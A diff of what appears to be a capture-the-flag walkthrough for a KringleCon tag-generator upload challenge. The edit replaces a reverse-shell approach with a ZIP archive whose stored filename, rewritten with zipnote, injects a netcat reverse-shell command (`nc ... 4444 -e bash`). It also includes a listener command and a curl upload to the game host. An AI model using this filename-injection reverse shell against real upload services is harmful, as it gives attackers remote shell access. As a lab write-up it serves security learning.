@@ -50,14 +50,17 @@ Create a file for executing a reverse shell named `t.jpg`:
 ```
 nc <your IP address> 4444 -e /bin/bash
 ```
-Create an executor file:
+Create a ZIP file including an empty jpg file:
 ```
-touch \'\`bash\ t.jpg\`\;\'.jpg
+touch joergen.jpg
+zip joergen.zip joergen.jpg
 ```
-Create the ZIP file including these two file for upload:
+Modify the contained filename to one with a shell command:
 ```
-zip joergen.zip t.jpg \'\`bash\ t.jpg\`\;\'.jpg
+printf "@ joergen.jpg\n@=\';nc <your IP address>.211.52.129 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
+
 ```
+
 Start the reverse shell listener on your local device:
 ```
 nc -lnvp 4444
@@ -75,7 +78,7 @@ printf "@ joergen.jpg\n@=\';nc 93.211.52.129 4444 -e \`which bash\`;#'.jpg\n" | 
 curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTUyNDYyNDc1OSwtODIzMDUwODYxLDEyOT
+eyJoaXN0b3J5IjpbMTk2NTY5MDk3MiwtODIzMDUwODYxLDEyOT
 M3MjA0MzksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3
 NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMz
 k4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3
